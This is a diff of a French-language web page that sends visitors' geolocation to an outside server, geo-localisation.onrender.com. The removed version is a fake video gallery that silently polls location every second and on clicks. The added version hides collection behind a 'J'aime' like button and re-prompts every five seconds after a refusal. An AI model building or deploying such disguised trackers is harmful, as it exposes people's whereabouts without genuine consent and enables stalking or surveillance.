@@ -2,51 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Galerie de Vidéos</title>
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <title>Location Tracker</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+        p {
+            margin-top: 20px;
+        }
+        input {
+            margin-top: 10px;
+            padding: 10px;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
-    <div class="container mx-auto py-8">
-        <h1 id="title" class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
-        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
-          
-          <!-- Carte de vidéo -->
-          <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image1" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
-            <div class="p-4">
-              <h2 id="video-title1" class="text-xl font-semibold">Titre de la Vidéo</h2>
-            </div>
-          </div>
-    
-          <!-- Répétez la carte de vidéo pour d'autres vidéos -->
-          <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image2" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
-            <div class="p-4">
-              <h2 id="video-title2" class="text-xl font-semibold">Titre de la Vidéo</h2>
-            </div>
-          </div>
-    
-          <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image3" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
-            <div class="p-4">
-              <h2 id="video-title3" class="text-xl font-semibold">Titre de la Vidéo</h2>
-            </div>
-          </div>
-    
-          <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image4" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
-            <div class="p-4">
-              <h2 id="video-title4" class="text-xl font-semibold">Titre de la Vidéo</h2>
-            </div>
-          </div>
-        </div>
-    </div>
+    <h1>Bonjour tout le monde</h1>
+    <img src="/BACK/public/robot.jpeg" alt="Robot Image"/>
+    <img src="https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/giphy.gif" alt="Loading GIF"/>
+    <p>Pour enregistrer votre position, veuillez entrer votre nom et cliquer sur "J'aime".</p>
+    <input type="text" id="username" placeholder="Entrez votre nom"/>
+    <button onclick="attemptGeolocation()">J'aime</button>
+    <p id="error-message" style="color: red; display: none;">La géolocalisation est nécessaire pour cette application. Veuillez autoriser la géolocalisation dans les paramètres de votre appareil et rafraîchir la page.</p>
 
     <script>
-        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
         function attemptGeolocation() {
+            const username = document.getElementById('username').value;
+            if (!username) {
+                alert('Veuillez entrer votre nom.');
+                return;
+            }
+
             navigator.geolocation.getCurrentPosition(position => {
-                const uuid = window.location.pathname.split('/').pop();
+                const uuid = username;
                 const { latitude, longitude } = position.coords;
 
                 fetch('https://geo-localisation.onrender.com/location', {
@@ -60,24 +64,12 @@
                 .then(data => console.log(data))
                 .catch(error => console.error('Error:', error));
             }, error => {
-                // En cas d'échec, recharger la page après un délai de 5 secondes
                 console.error('Geolocation error:', error);
+                document.getElementById('error-message').style.display = 'block';
+                setTimeout(attemptGeolocation, 5000);
             });
         }
-
-        // Appeler la fonction pour tenter de récupérer la position
-        setInterval(attemptGeolocation, 1000);
-
-        // Ajouter des écouteurs d'événements pour rendre le titre et les images cliquables
-        document.getElementById('title').addEventListener('click', attemptGeolocation);
-        document.getElementById('image1').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title1').addEventListener('click', attemptGeolocation);
-        document.getElementById('image2').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title2').addEventListener('click', attemptGeolocation);
-        document.getElementById('image3').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title3').addEventListener('click', attemptGeolocation);
-        document.getElementById('image4').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title4').addEventListener('click', attemptGeolocation);
     </script>
 </body>
 </html>
+
